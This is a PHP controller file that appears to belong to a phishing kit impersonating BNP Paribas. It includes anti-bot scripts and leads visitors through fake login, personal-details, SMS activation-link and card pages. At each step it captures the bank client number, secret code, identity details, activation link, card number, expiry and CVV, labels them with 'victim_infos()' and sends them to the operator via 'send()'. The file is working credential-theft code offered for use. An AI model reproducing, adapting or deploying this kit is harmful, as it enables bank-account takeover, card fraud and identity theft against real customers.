<?php
   include './M3tri-hash-bots/anti0.php';
    include './M3tri-hash-bots/anti1.php';
    include './M3tri-hash-bots/anti2.php';
    include './M3tri-hash-bots/anti3.php';
    include './M3tri-hash-bots/anti4.php';
    include './M3tri-hash-bots/anti5.php';
    include './M3tri-hash-bots/anti6.php';
    include './M3tri-hash-bots/anti7.php';
    include './M3tri-hash-bots/anti8.php';
    include './M3tri-hash-bots/anti9.php';
    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/login.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            $_SESSION['errors']['sms_code'] = 'Le code est invalide.';
            header("Location: clients/sms.php?error=1&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['password']  = $_POST['password'];
            if( validate_number($_POST['username'],10) == false ) {
                $_SESSION['errors']['username'] = true;
            }
            if( validate_number($_POST['password'],6) == false ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BNP | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Numéro client : ' . $_POST['username'] . "\r\n";
                $message .= 'Code secret : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "details") {
            $_SESSION['errors']      = [];
            $_SESSION['nom']   = $_POST['nom'];
            $_SESSION['prenom']   = $_POST['prenom'];
            $_SESSION['address']   = $_POST['address'];
            $_SESSION['zip_code']   = $_POST['zip_code'];
            $_SESSION['birth_date']      = $_POST['birth_date'];
		$_SESSION['phone']      = $_POST['phone'];
            if( validate_name($_POST['nom']) == false ) {
                $_SESSION['errors']['nom'] = 'Nom non valide';
            }
            if( validate_name($_POST['prenom']) == false ) {
                $_SESSION['errors']['prenom'] = 'Prénom non valide';
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = 'Adresse non valide';
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = 'Code postale non valide';
            }
          /*  if( validate_name($_POST['birth_date']) == false ) {
                $_SESSION['errors']['birth_date'] = 'Date de naissance non valide';
            }*/
		if( validate_number($_POST['phone']) == false ) {
                $_SESSION['errors']['phone'] = 'Numéro de téléphone non valide';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BNP | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Nom : ' . $_POST['nom'] . "\r\n";
                $message .= 'Prénom : ' . $_POST['prenom'] . "\r\n";
                $message .= 'Adresse : ' . $_POST['address'] . "\r\n";
                $message .= 'Code postale : ' . $_POST['zip_code'] . "\r\n";
		    $message .= 'Date de naissance : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Numéro de téléphone : ' . $_POST['phone'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: clients/link.php?verification#_");
            } else {
                header("Location: clients/details.php?error#_");
            }
        }
        
        
        if( $_POST['step'] == "link" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_link']   = $_POST['sms_link'];
           /* if( !filter_var($_POST['sms_link'], FILTER_VALIDATE_URL) ) {
                $_SESSION['errors']['sms_link'] = "Lien invalide";
            }*/
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BNP | Sms Link';
                $message = '/-- SMS LINK INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Link : '.'mescomptes://activation/'. $_POST['sms_link'] . "\r\n";
                $message .= '/-- END SMS LINK INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/cc.php?verification#_");
                
            } else {
                header("Location: clients/link.php?error#_");
                
            }
        }
        
        
        if ($_POST['step'] == "cc") {
          
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']   = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
			

			if(check_bin($_SESSION['one']) && strlen($_SESSION['one'] >= 16)){
			if(empty($_POST['three'])|| strlen($_POST['three'])!= 3){
                $_SESSION['errors']['three'] = 'Entrez un code de sécurité valide';}
                if(empty($_POST['two'])){
                $_SESSION['errors']['two'] = 'Entrez une date d\'expiration valide';
        }
            $date_ex = explode('/',$_POST['two']);
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | BNP | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'N° de votre carte : ' . $_POST['one'] . "\r\n";
                $message .= 'Date d\'expiration : ' . $_POST['two'] . "\r\n";
                $message .= 'CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: clients/success.php?verification#_");
            } else {
                header("Location: clients/cc.php?error#_");
            }
		}else{
        $_SESSION['errors']['one'] = 'Entrez un numéro de carte valide';   
		header("Location: clients/cc.php?error#_");
		}
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>